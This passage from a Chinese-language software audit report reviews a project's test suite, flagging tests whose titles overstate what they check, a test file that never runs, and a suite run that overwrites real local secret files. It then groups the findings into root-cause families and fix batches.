| REV-449 | 服务+资产 | 低-中 | 故障注入被换成正常路径 | `Tests/Durable/faultInjection.spec.ts:2` 自称"DUR-001~006 全量覆盖"，`:209` 的分节注释写"DUR-006: 满盘拒绝"，而 `:211` 实际用例标题是 **"DUR-006: Effect Journal 正常写入可验证"**——满盘场景从未注入（`Tests/E2E/crashRecovery.spec.ts:170-171` 也自陈"由于无法直接模拟磁盘满，验证…错误处理路径"）；`Tests/Infra/durable.spec.ts:5` 头注称覆盖 DUR-003/005/006，文件内只有 `:320` 等两项。影响：`Configs/benchBaseline.json:9` 与 `Benchmarks/baselines/metrics.json:10` 的 `faultInjectionCoverage:"DUR-001~006"`、以及 `experimentMatrix.json:31` 的 `ENV-DBFULL → existing-covered` 都据此自证。与 **REV-427**（基线无人刷新）同根，但现象不同：这里是**用例标题/头注与断言内容不符**。修复：注入桩（`fs.appendFileSync` 抛 `ENOSPC`）或把格与声称降为 `declared-only` | ✅实证（`:209` 注释与 `:211` 标题的矛盾由主审读到原文确认） |
| REV-450 | 服务 | 低-中 | 永不运行的测试文件 | `Tests/Integration/realAgentCallTest.ts` 头注自述"需重写/TODO"，而文件名既不匹配 `vitest.config.ts:22` 的 include（`Tests/**/*.spec.ts` / `*.test.ts`），也不进任何 tsconfig（**REV-308**）⇒ 它既不执行、也不报错、也不被类型检查，是 `Tests/Integration/`（实有 2 个文件）里唯一"看着像测试"的死文件。同目录另一种后缀并存说明 `spec`/`test` 命名无约定。修复：重写为 `.spec.ts` 或删除；把"Tests 下不得存在不匹配 include 的 `.ts`"纳入政策测试 | ✅复核 |

**已核对为干净（M16，避免重复排查）**：① 逐 spec 库文件唯一且 `initDatabase()` 前一律 `closeDatabase()+clearMigrations()+rmSync`，**REV-386** 式共享库毒化在本仓不成立；② 40 个 DB spec 全部真跑 `migrateUp`（不存在"有连接无表"的意外）；③ 四条 `hydrate*`（agents / 长期记忆 / GlobalWorkspace / 治理台账）各有专门的"重启回灌"用例，是 REV-431 想要的正确形态模板；④ `realAgent.spec.ts` 显式声明 300s/605s 级超时，不受 `testTimeout:30_000` 影响；⑤ `Tests/A2A/**` 真起 DB 并走真实路由表（`a2aApi.spec.ts:21-22` 用 `registerA2ARoutes`+`matchRoute`），是全仓形态最正确的接入层测试；⑥ `apiKeyNotice.spec.tsx:27-35` 以读后端源码方式锁 `MISSING_API_KEY_MARKER`，是本切片唯一的跨端契约断言（可作为 REV-445 的修法样板）；⑦ `.husky/pre-push:11` 的 `npm test` 无 `|| true`，本地推送门在"用例是否红"这一维度是真门；⑧ `Tests/**` 的 923 个相对 import 说明符**全部可解析**（主审脚本实测 unresolved = 0，首轮探针的 852 命中系把字符串字面量当 import 的假阳性）；⑨ `webSearchTool.spec.ts:26-39` 的 fetch 桩 + env 存取还原规范；⑩ `auditGovernanceGate`/`governanceProvisioning`/`broadcastGovernance` 的角色门用例正反对向齐备。

### 21.1 统计与归类

新增 **23 条**（REV-428~450）：严重 **2**（REV-428 假绿计绿 / REV-429 删动生产凭据）· 高 **7**（REV-430/431/432/433/434/435/436）· 中高 **5**（REV-437~441）· 中 **7**（REV-442~448）· 低-中 **2**（REV-449/450）。

成因族归属：

- **新增族建议 F6「测试自证」**——本片 23 条里有 **17 条**属同一结构：**oracle 由测试自己提供**（`:16-27` 自赋字面量、`:60-66` 自列族清单、`:38-47` 自写身份规则、`:71` 自拼 `deciders`、`existing-covered` 只验文件存在、`faultInjectionCoverage` 只据用例标题）。判据可固化：**一条用例的期望值若能在不改动 `Src/**` 的前提下被测试自身改写而仍为真，则该用例不计入覆盖**。
- **F5 已实现未接线**：REV-435/436/439/444/445/450（守门脚本零接线、死函数被计入覆盖、政策测试射程错位、入口零覆盖、生成器不进 CI、永不运行的文件）。与 M15 的 9 条同根，可共用一条"必须有读取点"的门禁。
- **F3 可观测性链断裂**：REV-428/430/442（该报警的时刻静默通过）。
- **F1 身份可自报**：REV-432/438。
- **F2 fail-soft 洗成空成功**：REV-439/448。

### 21.2 建议归并到的修复批次（待并入 §16.3）

| 归入 | 条目 | 理由 |
|---|---|---|
| **新增建议批次 P0-7 测试面假绿止血** | REV-428/429/430/431 | 排在 P0-6 之后、所有 P1 之前。理由与 P0-6 同构但面更大：**后面每一批修复的验收都要读这 150 个 spec 的绿灯**，而当前绿灯里含 12 处零断言通过、142 处前置失败即通过、以及一套生产从不使用的 `reset*` 隔离机制；不先止血，等于在坏掉的仪表上做后续所有修复。REV-429 还有一条独立的**数据破坏**风险，属于必须最先处理的类别 |
| 新增建议批次 **P1-11 资产-代码接线对账**（与 §20.2 合流） | REV-434/435/442/445/446 | M15 用它拦"配置键零读取点"，本片用它拦"门禁脚本零接线 + 锚点只验存在 + 清单硬编码"——同一批、同一处 CI 步骤可一并解决 |
| **P1-9 令牌与身份权威**（治理红线） | REV-432/436/437/438 | 与 M15 的 REV-420 同批：先把"谁能算一票、注入检测走哪条链、网络出口闸在哪"定成有执行点的口径，再谈测试对账 |
| 归 **P2-4 体验与口径** / 测试卫生 | REV-440/441/443/444/447/448/449/450 | 桩形状、超时量级、零断言用例、夹具口径与命名约定，属可在同一轮清理的工程质量项 |

### 21.3 需要真实环境才能取证的项目（M16）

| 待验证项 | 关联条目 | 需要的动作 |
|---|---|---|
| 缺密钥时 `npm test` 的 passed 计数与真实断言数的差值 | REV-428 | 不带 `HUAWEI_MAAS_API_KEY` 跑一次，比对带密钥时的 `expect` 执行数（需覆盖率插桩） |
| `secretsStore.spec.ts` 是否真的动过本机凭据 | REV-429 | **不在默认环境验证**：设 `CIVITAS_DATA_ROOT` 指向临时目录后单跑该文件，比对临时目录与 `Data/.secrets/` 的 mtime |
| CI 干净 checkout 上 `gateG0` 的 `Logs/` 断言是否红 | REV-442 | 在 `Logs/` 不存在的容器里单跑该 spec（本机 `Logs/` 已存在，无法复现） |
| 真实覆盖率是否 ≥ `coverageMinimum:80` | REV-434 | `coverage/coverage-final.json` 是 2026-09-28 旧产物，需重跑 `--coverage` 取证 |
| `taskDriverChain` 的桩下 `failure_count` 分支是否被走到 | REV-440 | 插桩统计或补一条 `satisfies SubtaskRow` 的失败用例 |
| 矩阵 20 个 `new-scaffold` 标签与 `Tests/Experiments/**` 的 `@matrix` 是否双向对得上 | REV-435 | 需写双向对账脚本（本子代理逐条读了 17 个标签，反向只能靠脚本） |

### 21.4 一句话结论

M16 的实质不是"测试写得少"，而是**本地这 150 个 spec 的绿灯不能用来主张任何事**：12 处真实调用用例在无密钥时零断言通过、142 处在被测函数返回 `err` 时零断言通过、隔离靠 88 个生产从不调用的 `reset*`、quorum 与身份口径由测试自己重写、覆盖率分母不含前端、守门脚本从不运行且只验文件存在——**而它声称守护的正是 REV-332/344/345/348 那批"只有真实运行才会暴露"的缺陷**。这与 M14 对云端的结论（REV-384/385/402）完全同构，差别在于本地这条线**每天都在产出绿灯并被引用**，所以止血顺序上 P0-7 应与 P0-6 并列、早于所有 P1；另有一条独立的数据破坏风险（REV-429：每次 `npm test` 都会删除并重背本机真实密钥文件）应当最先处理。
